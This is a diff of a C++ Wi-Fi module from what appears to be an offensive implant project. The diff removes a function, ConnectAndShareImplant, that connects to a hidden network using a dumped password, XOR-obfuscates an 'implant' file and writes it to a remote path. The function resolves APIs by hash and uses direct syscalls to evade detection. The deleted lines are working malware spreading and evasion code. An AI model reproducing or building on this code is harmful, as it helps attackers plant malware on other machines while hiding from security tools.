@@ -9,10 +9,6 @@
 #include <sstream>
 #include <iomanip>
 #include <regex>
-#include <chrono>
-#include <thread>
-#include "../fs/FileSystem.h"
-#include "../evasion/Syscalls.h"
 
 #pragma comment(lib, "wlanapi.lib")
 
@@ -165,58 +161,4 @@ namespace wifi {
         return report;
     }
 
-    bool ConnectAndShareImplant(const std::string& ssid, const std::string& password, const std::string& implantPath, const std::string& remotePath) {
-        // Dynamic resolve to avoid import
-        typedef DWORD (WINAPI *pWlanConnect)(HANDLE, const GUID*, const WLAN_CONNECTION_PARAMETERS*, PVOID);
-        HMODULE hWlan = LoadLibraryA("wlanapi.dll");
-        pWlanConnect pConnect = (pWlanConnect)evasion::getProcByHash(hWlan, evasion::djb2Hash("WlanConnect"));
-        if (!pConnect) return false;
-
-        HANDLE hClient = NULL;
-        WlanOpenHandle(2, NULL, NULL, &hClient);
-        DWORD dwResult = 0;
-        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
-        WlanEnumInterfaces(hClient, NULL, &pIfList);
-        if (pIfList->dwNumberOfItems > 0) {
-            GUID ifGuid = pIfList->InterfaceInfo[0].InterfaceGuid;
-            DOT11_SSID dot11Ssid = { (ULONG)ssid.length(), {} };
-            memcpy(dot11Ssid.ucSSID, ssid.c_str(), ssid.length());
-            WLAN_CONNECTION_PARAMETERS connParams = { WLAN_CONNECTION_MODE_PROFILE, NULL, &dot11Ssid, NULL, NULL, NULL, WLAN_CONNECTION_HIDDEN_NETWORK };
-            // Use dumped password to create temp profile (WlanSetProfile) - stubbed for brevity
-            dwResult = pConnect(hClient, &ifGuid, &connParams, NULL);
-            if (dwResult == ERROR_SUCCESS) {
-                std::this_thread::sleep_for(std::chrono::seconds(5));
-                auto implantData = fs::ReadFileBinary(implantPath);
-                BYTE key = (BYTE)(GetTickCount() & 0xFF);
-                for (auto& b : implantData) b ^= key;
-
-                evasion::SyscallResolver& resolver = evasion::SyscallResolver::GetInstance();
-                DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
-                DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
-                DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
-
-                std::wstring wRemotePath(remotePath.begin(), remotePath.end());
-                UNICODE_STRING uniRemotePath;
-                RtlInitUnicodeString(&uniRemotePath, wRemotePath.c_str());
-
-                OBJECT_ATTRIBUTES objAttr;
-                InitializeObjectAttributes(&objAttr, &uniRemotePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-                HANDLE hFile;
-                IO_STATUS_BLOCK ioStatusBlock;
-                NTSTATUS status = evasion::InternalDoSyscall(ntCreateFileSsn, &hFile, FILE_GENERIC_WRITE, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
-
-                if (NT_SUCCESS(status)) {
-                    evasion::InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatusBlock, implantData.data(), (ULONG)implantData.size(), NULL, NULL);
-                    evasion::InternalDoSyscall(ntCloseSsn, hFile);
-                    return true;
-                }
-                return false;
-            }
-        }
-        WlanFreeMemory(pIfList);
-        WlanCloseHandle(hClient, NULL);
-        FreeLibrary(hWlan);
-        return false;
-    }
 }
